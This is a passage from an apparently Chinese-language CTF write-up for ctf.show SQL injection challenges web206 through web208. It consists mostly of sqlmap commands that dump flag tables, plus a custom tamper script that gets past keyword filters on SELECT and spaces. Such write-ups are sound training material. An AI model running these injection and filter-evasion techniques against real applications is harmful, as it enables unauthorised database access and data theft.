sqlmap -u "http://95532399-e482-42f4-8f02-f9dd7da05b71.challenge.ctf.show/api/index.php"  --method="PUT" --data="id=1" --referer=ctf.show --safe-url="http://95532399-e482-42f4-8f02-f9dd7da05b71.challenge.ctf.show/api/getToken.php" --safe-freq=1 --headers="Content-Type: text/plain" --cookie="PHPSESSID=64giq9ecahg4udnj8d3jlsnq29;" --prefix="')" --suffix="#" -D ctfshow_web -T ctfshow_flaxc --dump
```

### web207

```text
sqlmap -u "http://ba6881d8-4d9b-4558-8cf0-cedef0f7c302.challenge.ctf.show/api/index.php"  --method="PUT" --data="id=1" --referer=ctf.show --safe-url="http://ba6881d8-4d9b-4558-8cf0-cedef0f7c302.challenge.ctf.show/api/getToken.php" --safe-freq=1 --headers="Content-Type: text/plain" --cookie="PHPSESSID=ijtgruf6btc269f58j12jr3seo;" --prefix="')" --suffix="#" --tamper=space2comment -D ctfshow_web -T ctfshow_flaxca --dump
```

### web208

过滤了select和空格

```text
sqlmap -u "http://ecaa8898-d8e6-4a96-bdcf-9ca3b17ad812.challenge.ctf.show/api/index.php"  --method="PUT" --data="id=1" --referer=ctf.show --safe-url="http://ecaa8898-d8e6-4a96-bdcf-9ca3b17ad812.challenge.ctf.show/api/getToken.php" --safe-freq=1 --headers="Content-Type: text/plain" --cookie="PHPSESSID=3mmbm7crft5lt3gh2ioso2pl3c;" --prefix="')" --suffix="#" --tamper=space2comment,uppercase.py -D ctfshow_web -T ctfshow_flaxcac --dump
可以使用内置脚本uppercase.py绕过
```

也可以选择直接写双写绕过替换

```text
#!/usr/bin/env python    RichardChai53佬的脚本，就是直接替换

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        retVal = retVal.replace("SELECT", "seselectlect")
    return retVal
```

##
